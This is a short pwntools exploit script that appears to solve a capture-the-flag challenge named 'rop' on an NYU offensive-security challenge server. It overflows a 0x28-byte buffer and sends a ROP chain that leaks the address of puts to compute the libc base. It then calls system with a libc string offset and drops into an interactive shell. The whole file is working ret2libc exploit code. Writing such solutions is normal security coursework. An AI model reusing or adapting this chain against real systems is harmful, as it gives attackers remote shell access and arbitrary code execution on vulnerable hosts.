from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal=['tmux','split','-h']
e=ELF('./rop')
#p=process('./rop', env={'LD_PRELOAD': './libc-2.23.so'})
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1343)
sla 		= lambda a,b: p.sendlineafter(a,b)
sa 			= lambda a,b: p.sendafter(a,b)
ra 			= lambda a: p.readuntil(a)

#gdb.attach(p, 'b*0x40064a')
libc = ELF("./libc-2.23.so")

rop = ROP(e)
rdi = rop.find_gadget(['pop rdi', 'ret']).address
print(rdi)
sla(":", b'rt1726')
sla(b'tools..', b'B'*0x28 + p64(rdi) + p64(e.sym.got.puts)+p64(e.sym.puts)+p64(e.sym.main)) 
p.recvline()
#p.recvline()
base = u64(p.readline()[:-1]+b'\0\0')-libc.sym.puts
#log.warning(hex(u64(p.readline()[:-1]+b'\0\0')))
#log.warning(hex(libc.sym.puts))
log.warning(hex(base))

libc.address = base
sla(b'..', b'B'*0x28 + p64(rdi) + p64(0x18cd57+base) + p64(libc.sym.system))
p.interactive()


